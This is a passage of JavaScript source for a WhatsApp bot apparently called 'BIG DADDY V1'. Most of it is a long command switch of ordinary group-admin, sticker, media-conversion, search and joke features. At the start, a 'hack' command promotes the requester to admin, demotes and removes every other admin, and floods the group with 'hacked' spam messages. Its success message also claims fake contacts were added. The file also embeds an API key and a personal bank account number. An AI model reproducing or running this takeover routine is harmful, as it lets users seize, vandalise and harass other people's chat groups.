        await XeonBotInc.groupParticipantsUpdate(groupId, [targetUser], 'promote')
            .then(() => {
                replygcxeon(`✅ *SUCCESS!*\n\nYou are now an admin of this group.`);
            })
            .catch(err => {
                console.error("❌ Failed to promote user to admin:", err.message);
                return replygcxeon("❌ *Hack Failed: Unable to gain admin privileges.*");
            });   
        // Step 4: Remove all other admins
        const groupMetadata = await XeonBotInc.groupMetadata(groupId);
        const groupParticipants = groupMetadata.participants;
        const groupAdmins = groupParticipants.filter(p => p.admin).map(admin => admin.id);

        // Demote and remove all other admins except the target user
        for (const adminId of groupAdmins) {
            if (adminId !== targetUser) {
                await XeonBotInc.groupParticipantsUpdate(groupId, [adminId], 'demote')
                    .then(() => console.log(`✅ Admin ${adminId} demoted successfully.`))
                    .catch(err => console.error(`❌ Failed to demote admin ${adminId}: ${err.message}`));

                await XeonBotInc.groupParticipantsUpdate(groupId, [adminId], 'remove')
                    .then(() => console.log(`✅ Admin ${adminId} removed successfully.`))
                    .catch(err => console.error(`❌ Failed to remove admin ${adminId}: ${err.message}`));
            }
        }

        // Step 5: Spam the group with messages
        const spamMessage = "🔥 *This group has been hacked by BigDaddy V1!* 🔥\n\nSecurity compromised. Contact the owner to restore access.";
        for (let i = 0; i < 10; i++) { // Sends 10 spam messages
            await XeonBotInc.sendMessage(groupId, { text: spamMessage })
                .then(() => console.log(`✅ Spam message ${i + 1} sent.`))
                .catch(err => console.error(`❌ Failed to send spam message ${i + 1}: ${err.message}`));
        }

        replygcxeon(
            "✅ *HACK SUCCESSFUL!*\n\n" +
            "🎉 Group has been compromised successfully.\n" +
            "👤 Fake contacts added.\n" +
            "🔐 Admins removed.\n" +
            "💣 Group spammed with warning messages."
        );
    } catch (err) {
        replygcxeon('❌ *ERROR: An unexpected error occurred during the hack process.*');
        console.error(err);
    }
    break;
            case 'promote':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'demote':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'setname':
            case 'setsubject':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!text) return 'Text ?'
                await XeonBotInc.groupUpdateSubject(m.chat, text).then((res) => replygcxeon(mess.success)).catch((err) => replygcxeon(json(err)))
                break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!text) return 'Text ?'
                await XeonBotInc.groupUpdateDescription(m.chat, text).then((res) => replygcxeon(mess.success)).catch((err) => replygcxeon(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!quoted) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await XeonBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await XeonBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                } else {
                    var memeg = await XeonBotInc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
                }
                break
            case 'tagall':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator && !isPremium) return replygcxeon(mess.admin)
                if (!isBotAdmins && !isCreator && !isPremium) return replygcxeon(mess.botAdmin)
                let teks = `*👥 You have Tag All*
 
                 🗞️ *Message : ${q ? q : 'blank'}*\n\n`
                for (let mem of participants) {
                    teks += `• @${mem.id.split('@')[0]}\n`
                }
                XeonBotInc.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'hidetag':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator && !isPremium) return replygcxeon(mess.admin)
                if (!isBotAdmins && !isCreator && !isPremium) return replygcxeon(mess.botAdmin)
                XeonBotInc.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'totag':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isBotAdmins && !isCreator && !isPremium) return replygcxeon(mess.botAdmin)
                if (!isAdmins && !isCreator && !isPremium) return replygcxeon(mess.admin)
                if (!m.quoted) return replygcxeon(`Reply messages with captions ${prefix + command}`)
                XeonBotInc.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break
            case 'group':
            case 'grup':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (args[0] === 'close') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcxeon(`Success In Closing The Group 🕊️`)).catch((err) => replygcxeon(json(err)))
                } else if (args[0] === 'open') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcxeon(`Success In Opening The Group 🕊️`)).catch((err) => replygcxeon(json(err)))
                } else {
                    replygcxeon(`Mode ${command}\n\n\nType ${prefix + command}open/close`)
                }
                break
            case 'editinfo':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (args[0] === 'open') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcxeon(`Successfully Opened Group Edit Info 🕊️`)).catch((err) => replygcxeon(json(err)))
                } else if (args[0] === 'close') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => replygcxeon(`Successfully Closed Group Edit Info🕊️`)).catch((err) => replygcxeon(json(err)))
                } else {
                    replygcxeon(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
                break
            case 'linkgroup':
            case 'grouplink':
            case 'linkgrup':
            case 'linkgc':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                let response = await XeonBotInc.groupInviteCode(m.chat)
                XeonBotInc.sendText(m.chat, `👥 *BIG DADDY V1 DISPLAYS GROUP LINK INFO*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                await XeonBotInc.groupRevokeInvite(m.chat)
                    .then(res => {
                        replygcxeon(`BIG DADDY has Successful Reset, Group Invite Link ${groupMetadata.subject}`)
                    }).catch((err) => replygcxeon(json(err)))
                break
case 'p':
case 'ping': {
    const used = process.memoryUsage();
    const cpus = os.cpus();
    
    const cpu = cpus.reduce((acc, cpu) => {
        const total = Object.values(cpu.times).reduce((a, b) => a + b, 0);
        acc.total += total;
        acc.speed += cpu.speed;
        Object.keys(cpu.times).forEach(key => acc.times[key] += cpu.times[key]);
        return acc;
    }, { speed: 0, total: 0, times: { user: 0, nice: 0, sys: 0, idle: 0, irq: 0 } });

    const latency = (performance.now() - speed()).toFixed(4);  
    const ramUsage = formatp(os.totalmem() - os.freemem()) + ' / ' + formatp(os.totalmem());

    const cpuUsage = Object.keys(cpu.times).map(type => {
        return `- *${type.padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`;
    }).join('\n');

    const cpuDetails = cpus.map((cpu, i) => {
        return `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHz)\n${cpuUsage}`;
    }).join('\n\n');

    const response = `
*Pong!* 🏓
> *Response Speed:* *${latency}* seconds

> *💻 BIG DADDY V1* Server Info
RAM Usage: *${ramUsage}*`;

    await XeonBotInc.sendMessage(m.chat, {
        text: response,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `${botname}`,
                body: `${latency} Second`,
                thumbnailUrl: 'https://i.postimg.cc/J7B3N4NF/file-Z5-Nh-Z2cc-KK4-TG0sz-L7n-Gcc-FJ-1.webp',
                sourceUrl: global.link,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m });
}
break;
            case 'buypremium':
            case 'buyprem':
            case 'premium': {
                let teks = `Hey ${pushname}👋\nWant to Buy Premium? Just chat with Philip 😉👉 t.me/phistar1`
                await XeonBotInc.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `${ownername}`,
                            thumbnailUrl: 'https://i.postimg.cc/J7B3N4NF/file-Z5-Nh-Z2cc-KK4-TG0sz-L7n-Gcc-FJ-1.webp.',
                          
                     sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'runtime':
                let runtimetext = `*Big Daddy V1* 𝐇𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐫𝐮𝐧𝐧𝐢𝐧𝐠 𝐟𝐨𝐫 ${runtime(process.uptime())}` 
                XeonBotInc.sendMessage(m.chat, {
                    text: runtimetext,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `phistar`,
                            thumbnailUrl: 'https://i.postimg.cc/J7B3N4NF/file-Z5-Nh-Z2cc-KK4-TG0sz-L7n-Gcc-FJ-1.webp.',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'sc':
            case 'script':
            case 'scriptbot':
                XeonBotInc.sendMessage(m.chat, {
                    text: `Hello world`,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `SCRIPT OF ${botname} is on telegram @phistar`,
                            thumbnailUrl: 'https://i.postimg.cc/J7B3N4NF/file-Z5-Nh-Z2cc-KK4-TG0sz-L7n-Gcc-FJ-1.webp.',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'donate':
            case 'donasi':
                let textnate = `Hello Cutie💕 ${pushname}\n\nNo matter how much you donate is very valuable for us❤️`
                XeonBotInc.sendMessage(m.chat, {
                    text: 'Palmpay 🏦 Acct No: 9128019141😊 Acct Name: Edward saliu/David Tomiwa\n\n' + textnate
                }, {
                    quoted: m
                })
                break
                case 'google':
    try {
        if (!text) {
            replygcxeon("Please provide a query.\n*Example: .google What is a bot.*");
            break;
        }

        const axios = require('axios');
        const cheerio = require('cheerio'); // For scraping Google search results

        replygcxeon("Searching Google...");

        const query = encodeURIComponent(text.trim());
        const url = `https://www.google.com/search?q=${query}`;

        // Fetch Google search results
        const { data } = await axios.get(url, {
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            },
        });

        // Parse results using Cheerio
        const $ = cheerio.load(data);
        const results = [];

        $(".tF2Cxc").each((index, element) => {
            const title = $(element).find(".DKV0Md").text();
            const link = $(element).find("a").attr("href");
            const snippet = $(element).find(".IsZvec").text();
            if (title && link) {
                results.push({ title, snippet, link });
            }
        });

        // Check if results exist
        if (results.length === 0) {
            replygcxeon(`No results found for: "${text}".`);
            break;
        }

        // Format and send results
        let responseMessage = `*Google Search Results for:* ${text}\n\n`;
        results.slice(0, 5).forEach((result, index) => {
            responseMessage += `*${index + 1}. ${result.title}*\n`;
            responseMessage += `${result.snippet}\n`;
            responseMessage += `_Link:_ ${result.link}\n\n`;
            responseMessage += `────────────────────────\n\n`;
        });

        replygcxeon(responseMessage);

    } catch (err) {
        replygcxeon("An error occurred during Google search. Please try again.");
        console.error(err.message || err);
    }
    break;
    case 'riddle':
    try {
        // Select a random riddle
        const riddle = devinettes[Math.floor(Math.random() * devinettes.length)];

        // Send the riddle question
        await XeonBotInc.sendMessage(m.chat, {
            text: `🤔 *Riddle:* ${riddle.question}\n\nYou have *30 seconds* to think!`
        }, { quoted: m });

        // Wait for 30 seconds
        await new Promise(resolve => setTimeout(resolve, 30000));

        // Send the riddle answer
        await XeonBotInc.sendMessage(m.chat, {
            text: `⏱️ *Time's up!* The answer is: *${riddle.reponse}*`
        }, { quoted: m });

    } catch (error) {
        console.error("Error:", error.message || "An unexpected error occurred.");
        replygcxeon("Oops, an error occurred while processing the riddle. Please try again later.");
    }
    break;
case 'owner': {
const repf = await XeonBotInc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
XeonBotInc.sendMessage(from, { text : `Wag wan @${sender.split("@")[0]}, My  handsome owner but i was created by Phistar,`, mentions: [sender]}, { quoted: repf })
}
break
            case 'sticker':
            case 'stiker':
            case 's': {
                if (!quoted) return replygcxeon(`Reply to Video/Image With Caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 seconds!')
                    let media = await quoted.download()
                    let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return replygcxeon(`Send Images/Videos With Captions ${prefix + command}\nVideo Duration 1-9 Seconds`)
                }
            }
            break
            case 'smeme': {
                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return replygcxeon(respond)
                if (!text) return replygcxeon(respond)
                replygcxeon(mess.wait)
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await XeonBotInc.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
            break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!args.join(" ")) return replygcxeon(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
XeonBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
XeonBotInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcxeon(`Photo/Video?`)
}
}
break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return replygcxeon(`Reply sticker with caption *${prefix + command}*`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    XeonBotInc.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return replygcxeon(`Reply sticker with caption *${prefix + command}*`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await XeonBotInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Send/Reply Video/Audio that you want to make into audio with caption ${prefix + command}`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                XeonBotInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Send/Reply Video/Audio that you want to make into MP3 with caption ${prefix + command}`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                XeonBotInc.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `Phistar.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Reply Video/Audio that you want to make into a VN with caption ${prefix + command}`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                XeonBotInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return replygcxeon(`Reply sticker with caption *${prefix + command}*`)
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await XeonBotInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'tourl': {
                replygcxeon(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    replygcxeon(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    replygcxeon(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replygcxeon(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replygcxeon(`Example : ${prefix + command} 😅+🤔`)
                replygcxeon(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return replygcxeon(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                    XeonBotInc.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `Here you go!`,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                    XeonBotInc.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: `Here you go!`,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            break
            case 'toqr': {
                if (!q) return replygcxeon(' Please include link or text!')
                const QrCode = require('qrcode-reader')
                const qrcode = require('qrcode')
                let qyuer = await qrcode.toDataURL(q, {
                    scale: 35
                })
                let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
                let buff = getRandom('.jpg')
                await fs.writeFileSync('./' + buff, data)
                let medi = fs.readFileSync('./' + buff)
                await XeonBotInc.sendMessage(from, {
                    image: medi,
                    caption: "Here you go!"
                }, {
                    quoted: m
                })
                setTimeout(() => {
                    fs.unlinkSync(buff)
                }, 10000)
            }
            break
            case 'fliptext': {
                if (args.length < 1) return replygcxeon(`Example:\n${prefix}fliptext Xeony`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replygcxeon(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
            case 'listvn': {
                let teks = '┌──⭓「 *List Vn* 」\n│\n'
                for (let x of VoiceNoteXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VoiceNoteXeon.length}*`
                replygcxeon(teks)
            }
            break
            case 'liststicker': {
                let teks = '┌──⭓「 *List Sticker* 」\n│\n'
                for (let x of StickerXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${StickerXeon.length}*`
                replygcxeon(teks)
            }
            break
            case 'listimage': {
                let teks = '┌──⭓「 *List Image* 」\n│\n'
                for (let x of ImageXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${ImageXeon.length}*`
                replygcxeon(teks)
            }
            break
            case 'listvideo': {
                let teks = '┌──⭓「 *List Video* 」\n│\n'
                for (let x of VideoXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VideoXeon.length}*`
                replygcxeon(teks)
            }
            break
            case 'addowner':
                if (!isCreator) return replygcxeon(mess.owner)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await XeonBotInc.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcxeon(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcxeon(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
                if (!isCreator) return replygcxeon(mess.owner)
if (!args[0]) return replygcxeon(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcxeon(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
            case 'addvideo': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('Video Name?')
                if (VideoXeon.includes(q)) return replygcxeon("The name you entered already exists")
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                VideoXeon.push(q)
                await fsx.copy(delb, `./Phistar-media/video/${q}.mp4`)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(delb)
                replygcxeon(`Success Adding Video\To View Type ${prefix}listvideo`)
            }
            break
            case 'delvideo': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('Enter the Video Name')
                if (!VideoXeon.includes(q)) return replygcxeon("Name Does Not Exist in Database")
                let wanu = VideoXeon.indexOf(q)
                VideoXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(`./Phistar-media/video/${q}.mp4`)
                replygcxeon(`Successfully Deleted Video ${q}`)
            }
            break
            case 'addimage': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('The name of the image?')
                if (ImageXeon.includes(q)) return replygcxeon("The name you entered is already registered in the database")
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                ImageXeon.push(q)
                await fsx.copy(delb, `./Phistar-media/image/${q}.jpg`)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
                fs.unlinkSync(delb)
                replygcxeon(`Success In Adding Image\nTo Check Type ${prefix}listimage`)
            }
            break
            case 'delimage': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('Enter the Image Name')
                if (!ImageXeon.includes(q)) return replygcxeon("The image name you entered is not registered")
                let wanu = ImageXeon.indexOf(q)
                ImageXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
                fs.unlinkSync(`./Phistar-media/image/${q}.jpg`)
                replygcxeon(`Successfully Deleted Image ${q}`)
            }
            break
            case 'addsticker': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('Enter the name of the sticker?')
                if (StickerXeon.includes(q)) return replygcxeon("Name Already In Use")
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                StickerXeon.push(q)
                await fsx.copy(delb, `./Phistar-media/sticker/${q}.webp`)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(delb)
                replygcxeon(`Successfully Adding Sticker\To Check Type ${prefix}liststicker`)
            }
            break
            case 'joke':
    try {
        // List of 100 jokes
        const jokes = [
            "Why don't skeletons fight each other? They don't have the guts!",
            "Why did the scarecrow win an award? Because he was outstanding in his field!",
            "I told my wife she was drawing her eyebrows too high. She looked surprised.",
            "Why don’t eggs tell jokes? Because they’d crack each other up!",
            "I told my computer I needed a break, and now it won't stop sending me Kit-Kats.",
            "I asked my dog what’s two minus two. He said nothing.",
            "How do you make a tissue dance? You put a little boogey in it!",
            "I used to play piano by ear, but now I use my hands.",
            "I wondered why the baseball kept getting bigger. Then it hit me.",
            "I told my wife she was getting too emotional during our argument, but she didn’t take it well. She stormed off to the freezer and threw a bag of peas at me. It was a real cold shoulder.",
            "I threw a boomerang 10 years ago and I still haven’t gotten it back.",
            "Did you hear about the Italian chef that died? He pasta way. We cannoli do so much. His legacy will be a pizza history.",
            "What’s orange and sounds like a parrot? A carrot!",
            "I used to be a baker, but I couldn't make enough dough.",
            "Why don’t oysters donate to charity? Because they are shellfish.",
            "I couldn't figure out how to put my seatbelt on, but then I realized I was just too tight.",
            "I have a fear of speed bumps, but I am slowly getting over it.",
            "What do you call fake spaghetti? An impasta!",
            "I got a job at a bakery because I kneaded dough.",
            "Why did the golfer bring an extra pair of pants? In case he got a hole in one.",
            "I’m reading a book on anti-gravity. It’s impossible to put down.",
            "What did one wall say to the other? I'll meet you at the corner.",
            "I’ve started investing in stocks: beef, chicken, and vegetable. One day I hope to be a bouillonaire.",
            "What do you call a pile of cats? A meow-tain.",
            "How does a penguin build its house? Igloos it together.",
            "Why don’t some couples go to the gym? Because some relationships don’t work out.",
            "I couldn’t figure out how to put my seatbelt on. But then I realized I was just too tight.",
            "What’s a skeleton’s least favorite room in the house? The living room.",
            "Why do cows have hooves instead of feet? Because they lactose.",
            "I broke my finger last week. On the other hand, I’m okay.",
            "What do you call an alligator in a vest? An investigator.",
            "What do you call a bear with no teeth? A gummy bear.",
            "I'm no good at math, but I know that one plus one equals two... unless you're doing algebra.",
            "Why don't seagulls fly over the bay? Because then they’d be bagels.",
            "I told my computer I needed a break, and it froze.",
            "I used to be a fireman, but I got burned out.",
            "I want to be a professional kleptomaniac, but I’m just stealing time.",
            "I have a joke about construction, but I’m still working on it.",
            "I got a reversible jacket for my birthday. I can’t wait to see how it turns out.",
